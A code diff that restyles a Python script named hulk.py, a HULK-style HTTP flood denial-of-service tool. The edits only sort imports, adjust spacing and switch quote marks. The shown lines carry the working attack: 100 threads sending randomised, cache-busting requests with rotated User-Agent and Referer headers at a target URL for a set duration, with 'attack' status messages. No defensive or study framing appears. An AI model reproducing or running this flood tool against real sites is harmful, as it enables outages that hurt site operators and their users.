@@ -5,14 +5,14 @@
 # Example: python3 hulk.py 60 http://192.168.1.172
 # ----------------------------------------------------------------------------------------------
 
-import sys
-import threading
+import os
 import random
 import re
+import sys
+import threading
 import time
-import os
-import urllib.request
 import urllib.error
+import urllib.request
 
 # Globals
 url = ''
@@ -22,13 +22,16 @@ headers_referers = []
 request_counter = 0
 flag = 0
 
+
 def inc_counter():
     global request_counter
     request_counter += 1
 
+
 def set_flag(val):
     global flag
     flag = val
+
 
 def useragent_list():
     global headers_useragents
@@ -39,16 +42,15 @@ def useragent_list():
         'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
     ]
 
+
 def referer_list():
     global headers_referers
-    headers_referers = [
-        'http://www.google.com/?q=',
-        'http://www.bing.com/search?q=',
-        f'http://{host}/'
-    ]
+    headers_referers = ['http://www.google.com/?q=', 'http://www.bing.com/search?q=', f'http://{host}/']
+
 
 def buildblock(size):
     return ''.join(chr(random.randint(65, 90)) for _ in range(size))
+
 
 def usage():
     print('---------------------------------------------------')
@@ -56,18 +58,19 @@ def usage():
     print('Example: python3 hulk.py 60 http://192.168.1.172')
     print('---------------------------------------------------')
 
+
 def httpcall(target_url):
     useragent_list()
     referer_list()
     param_joiner = '&' if '?' in target_url else '?'
-    full_url = target_url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10))
+    full_url = target_url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
 
     request = urllib.request.Request(full_url)
     request.add_header('User-Agent', random.choice(headers_useragents))
     request.add_header('Cache-Control', 'no-cache')
     request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-    request.add_header('Keep-Alive', str(random.randint(110,120)))
+    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
+    request.add_header('Keep-Alive', str(random.randint(110, 120)))
     request.add_header('Connection', 'keep-alive')
     request.add_header('Host', host)
 
@@ -81,6 +84,7 @@ def httpcall(target_url):
     else:
         inc_counter()
 
+
 class HTTPThread(threading.Thread):
     def run(self):
         try:
@@ -89,15 +93,17 @@ class HTTPThread(threading.Thread):
         except Exception:
             pass
 
+
 class MonitorThread(threading.Thread):
     def run(self):
         previous = request_counter
         while flag == 0:
             time.sleep(5)
             if request_counter - previous >= 100:
-                print(f"[+] {request_counter} requests sent")
+                print(f'[+] {request_counter} requests sent')
                 previous = request_counter
-        print("[*] HULK attack ended.")
+        print('[*] HULK attack ended.')
+
 
 # Entry
 if __name__ == '__main__':
@@ -112,13 +118,13 @@ if __name__ == '__main__':
         sys.exit('[!] First argument must be an integer duration in seconds.')
 
     url = sys.argv[2]
-    if not url.startswith("http"):
-        url = "http://" + url
+    if not url.startswith('http'):
+        url = 'http://' + url
 
     m = re.search(r'(https?\://)?([^/]+)', url)
     host = m.group(2)
 
-    print(f"[*] Starting HULK attack on {url} for {duration} seconds.")
+    print(f'[*] Starting HULK attack on {url} for {duration} seconds.')
 
     threads = []
     for _ in range(100):
@@ -132,5 +138,5 @@ if __name__ == '__main__':
     monitor.start()
 
     time.sleep(duration)
-    print("[*] Duration reached. Exiting now.")
+    print('[*] Duration reached. Exiting now.')
     os._exit(0)
